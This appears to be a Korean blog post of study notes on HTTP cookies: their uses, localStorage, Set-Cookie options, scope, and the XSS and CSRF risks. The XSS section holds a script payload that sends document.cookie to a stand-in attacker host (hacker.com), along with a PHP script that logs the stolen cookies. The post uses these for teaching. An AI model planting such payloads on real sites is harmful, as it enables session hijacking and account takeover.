---
title: HTTP 쿠키
author: ngwoon
layout: post
categories:
- Network
tags:
- HTTP
- Network
- Cookie
- 쿠키
---

# [Network] HTTP 쿠키
- - -

본 내용은 [MDN HTTP 쿠키](https://developer.mozilla.org/ko/docs/Web/HTTP/Cookies)를 보고 공부, 정리한 내용입니다.<br/>

## HTTP 쿠키란?

서버가 웹 브라우저에 전송하는 작은 데이터 조각.

브라우저는 쿠키를 갖고 있다가 동일한 서버에 재요청 시 쿠키를 함께 전송한다. 서버는 쿠키를 보고 클라이언트 정보를 파악할 수 있으므로, Stateless한 HTTP에서 클라이언트의 정보를 관리할 수 있게 해준다.

## 쿠키의 목적

1. 세션 관리

    서버에 저장해야 할 로그인, 장바구니, 게임 스코어 등의 정보를 관리하기 용이하다.

2. 개인화

    클라이언트가 지정한 테마, 설정 등의 정보를 관리할 수 있다.

3. 트래킹 (추적)

    사용자의 행동을 기록, 분석할 때 쓰인다.

- 과거엔 클라이언트 측에 정보를 저장하기 위해 쿠키를 사용했으나, HTML5에서 LocalStorage를 지원하기 시작하면서 정보 저장을 위해서는 modern storage APIs 종류 중 하나인 **웹 스토리지 API** (LocalStorage 또는 SessionStorage) 와 IndexedDB를 사용한다.

## 쿠키와 로컬스토리지

HTML5의 등장과 함께 새로운 Javascript객체인 SessionStorage와 LocalStorage가 쿠키의 대안으로 떠올랐다.  두 방식은 어떤 차이점이 있을까?

### 쿠키

쿠키는 여러 개의 텍스트 파일 형식으로 클라이언트 측에 저장된다. 최대 크기는 4KB이며, 사이트에 방문한 페이지를 저장하거나 유저의 로그인 정보를 저장하는 등 다양한 방법으로 사용된다. 서버에 처음으로 요청 시 서버에서 클라이언트로 쿠키 저장을 요청할 수 있고, 이후 클라이언트가 동일한 서버에 재요청 시 해당 쿠키 내역을 함께 전송한다. 

텍스트 파일 형태이므로 문자열 데이터만 저장할 수 있다. 

### 로컬스토리지

쿠키와 역할은 비슷하나, 가장 큰 차이점 중 하나는 모든 HTTP 요청에서 데이터를 주고 받을 필요가 없다는 점이다. 대신 LocalStorage를 이용하면 클라이언트 - 서버 간 트래픽과 낭비되는 대역폭의 양을 줄일 수 있다. 

또한 쿠키는 만료 기간이 정해져 있기 때문에 인터넷 연결이 불안정하거나 끊길 시 데이터가 사라질 위험이 있지만, LocalStorage는 자바스크립트 코드를 통해 삭제하지 않으면 클라이언트 측에 영구히 저장된다. 아울러 최대 저장 크기도 5MB로 쿠키보다 훨씬 방대하며, 문자열 이외에 JS의 primitives, object 형 데이터도 저장 가능하다.

(*primitives : JS의 기본 타입. undefined, null, boolean, string, number 5가지가 있다.)

다만, 로컬스토리지는 클라이언트 측에 영구히 남아있을 수 있는 정보이므로 보안적인 이슈를 고려해야 한다. 저장된 데이터를 암호화하거나, 인터넷에 재연결되었을 때 해당 데이터를 업로드 후 로컬에서 삭제하는 것이 바람직하다.

## 쿠키의 생성, 사용

서버에서 Set-Cookie 헤더를 HTTP 응답 헤더에 명시함으로써 만들 수 있다.

```jsx
// Set-Cookie 헤더 표기법
Set-Cookie: <cookie-name>=<cookie-value>; options

// HTTP 응답 메세지 예시
HTTP/1.0 200 OK                        // 시작줄
Content-type: text/html                // 헤더
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]                         // 본문
```

클라이언트 측에 쿠키가 생성되면, 동일한 서버에 재요청 시 쿠키 헤더를 HTTP 요청 헤더에 명시한다.

```jsx
// HTTP 요청 메세지 예시
GET /sample_page.html HTTP/1.1                        // 시작줄
Host: www.example.org                                 // 헤더
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

## 쿠키의 종류

### 1. 세션 쿠키(Session Cookie)

세션 쿠키란 브라우저가 실행중일 때만 유효한 쿠키이다. 보통 서버에서 HTTP 응답 메세지를 보낼 때 max-age와 expires 옵션 모두 명시하지 않으면 세션 쿠키로 취급된다.

### 2. 영속적인 쿠키 (Persistent Cookie)

영속적인 쿠키는 서버에서 max-age 혹은 expires 옵션을 명시하여 만료 기간이 정해진 쿠키를 말한다. 

### 3. 보안 쿠키 (Secure Cookie)

Set-Cookie 시 Secure옵션을 사용하면 보안 쿠키가 된다. 이 쿠키는 HTTPS 프로토콜 상에서 암호화된 요청일 경우에만 전송된다. 즉, HTTPS 요청일 때만 브라우저가 서버에게 쿠키를 전송하며, 그렇지 않으면 전송하지 않는다. (HTTP 에서는 Secure 옵션 사용 불가) 

Secure옵션을 설정해도 연결 자체가 취약할 수 있으므로, 민감한 정보는 쿠키에 저장하지 않는 것이 원칙이다.

### 4. HttpOnly 쿠키

HttpOnly 옵션을 사용하면 자바스크립트의 document.cookie를 통해 쿠키 정보에 접근할 수 없게 된다. Cross-site 스크립팅 (XSS) 공격을 방지하기 위한 옵션이다.

```jsx
// Secure, HttpOnly 옵션을 첨가했으므로 이 쿠키는 Https 연결 상에서만 서버로 전송되고,
// 자바스크립트의 document.cookie 코드로 쿠키에 접근할 수 없다.
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

### 5. SameSite 쿠키

SameSite 옵션은 CSRF (Cross-Site-Request-Forgery) 공격을 방지하기 위한 옵션이다. 말 그대로 SameSite는 쿠키가 cross-site의 요청과 함께 전달되지 않음을 요구하는 방식으로 CSRF 공격을 방지한다. 아직까지는 실험 중에 있으며, 지원하는 브라우저도, 그렇지 않은 브라우저도 있다. 

## 쿠키의 스코프

Domain과 Path 옵션은 쿠키의 스코프를 명시한다.

### Domain

Domain 옵션은 쿠키가 전송될 도메인의 범위를 지정한다. 예를 들어, domain=google.com 으로 설정한다면 이 쿠키는 google.com을 포함한 서브 도메인에게만 전송된다.

(서브 도메인 예시 : mail.google.com, translate.google.com 등)

### Path

path 옵션은 해당 쿠키가 전송될 URL의 범위를 지정한다. 예를 들어, path=/docs 로 설정한다면 이 쿠키는 /docs, /docs/main, /docs/index 등과 같은 경로는 전송되지만 /other 과 같은 경로는 해당 쿠키를 받을 수 없다.

## 보안

쿠키는 클라이언트 측에 저장되는 만큼 보안이 취약하다. 대표적으로 XSS (Cross-Site Scripting) 과 CSRF (Cross-Site Request Forgery) 공격에 쿠키가 이용된다. 각 공격 기법에 대한 자세한 내용은 나중에 다루고, 여기서는 쿠키가 어떻게 이용될 수 있는지를 살펴보자.

### XSS

XSS는 공격자가 특정 사이트에 자바스크립트 코드를 심어 타 클라이언트의 쿠키에 저장되어 있는 세션 ID를 훔치는 기술을 의미한다.

사이트 제작자가 입력 데이터 검사를 허술하게 할 경우 XSS 공격에 쉽게 노출될 수 있다.

예를 들어 어떤 게시판 사이트가 있을 때, 내용을 입력하는 부분에 공격자가 아래와 같은 내용을 입력 후 게시글을 포스트 했다고 가정하자.

```jsx
// hacker.com은 해커의 서버
// 해커는 자신의 서버 내에 cookie.php 파일을 만들어 둔다. 이 파일은 get으로 넘어온 데이터를
// 파싱하여 data.txt 파일로 저장해두는 파일이라고 생각하면 된다.
<script>window.open("http://hacker.com/cookie.php?data="+document.cookie)</script>
```

해커의 cookie.php 파일의 내용은 아래와 같다.

```php
<?

$cookie=$_GET['data'];

$atime=date("y-m-d H:i:s"); // atime에 연월분초 형태로 저장

$log=fopen("data.txt","a"); // 데이터 저장할 .txt파일 open

fwrite($log,$atime." ".$cookie."\r\n"); // data.txt 파일에 시간, 세션ID 저장

fclose($log);

?>
```

만약 관리자가 해당 포스트를 클릭한다면, 게시판 서버는 게시글 내용 (위 JS 코드) 을 관리자의 브라우저에 전달하고, js코드가 관리자의 브라우저에서 실행되며 세션 ID는 해커의 .txt 파일로 넘어가게 된다.

해커는 이 세션 ID를 어떻게 이용할 수 있을까?

![naver cookie](/assets/images/post/Network/HTTP-Cookie/session-id-browser.png)

위 이미지는 네이버에 로그인한 뒤 무언가를 검색했을 때의 모습이다. 쿠키 값 내에 세션 ID가 담겨있는 것을 볼 수 있다. 이 값을 변경하여 서버에게 전달하면, 서버는 세션 ID만을 보고 판단하기 때문에 이를 관리자의 요청으로 받아들이고, 해커는 쉽게 관리자 권한을 얻을 수 있다. (관리자로 로그인된 화면을 볼 수 있음)

물론 해커가 얻은 세션은 관리자의 세션이 사라짐과 함께 사라지지만, 관리자 권한을 누군가가 얻을 수 있다는 것만으로도 충분히 위협적인 공격이다. 

현재 많은 웹페이지들은 이와 같은 공격을 막기 위해 제한된 내용만 입력 가능하도록 조치한다. 하지만 이런 방어책이 마련되지 않은 사이트들 또한 꽤 많다.  

### CSRF

CSRF는 XSS와 비슷하지만 조금 다르다. XSS가 자바스크립트를 이용한 세션 하이재킹이라면, CSRF는 일반 사용자가 자신이 의도하지 않은 동작을 특정 웹사이트에 하게끔 해커가 의도하는 것이다.

가장 와닿는 예시로 금융 사이트를 들어보자.

1. 사용자가 인터넷 뱅킹을 위해 로그인을 하게되면, 해당 사이트에서 쿠키를 발급한다.
2. 해당 쿠키가 만료되기 전, 사용자가 공격자가 코드를 심어놓은 웹사이트를 방문하거나 이메일을 열람한다. 해당 코드는 특정 계좌로 돈을 이체하도록 금융 사이트에 요청하는 코드이다.
3. 금융 사이트 입장에서는 쿠키를 발급받은 사용자의 요청이므로 정상적으로 요청을 수행하게 된다.

CSRF가 무엇인지 이해를 돕기 위한 예시이므로 실제 동작 방식은 더 복잡하고 어려울 것이다. 지금은 쿠키를 이용하여 이러한 공격이 가능하다는 것만 알아두자.

CSRF 공격을 방지하기 위해 CSRF 토큰(위조 방지 토큰) 을 주로 사용한다. 



### 참고

쿠키와 로컬스토리지<br/>
[https://medium.com/@erwinousy/쿠키-vs-로컬스토리지-차이점은-무엇일까-28b8db2ca7b2](https://medium.com/@erwinousy/%EC%BF%A0%ED%82%A4-vs-%EB%A1%9C%EC%BB%AC%EC%8A%A4%ED%86%A0%EB%A6%AC%EC%A7%80-%EC%B0%A8%EC%9D%B4%EC%A0%90%EC%9D%80-%EB%AC%B4%EC%97%87%EC%9D%BC%EA%B9%8C-28b8db2ca7b2)

XSS<br/>
[https://m.blog.naver.com/PostView.nhn?blogId=yjsec36&logNo=221490526587&proxyReferer=https:%2F%2Fwww.google.com%2F](https://m.blog.naver.com/PostView.nhn?blogId=yjsec36&logNo=221490526587&proxyReferer=https:%2F%2Fwww.google.com%2F)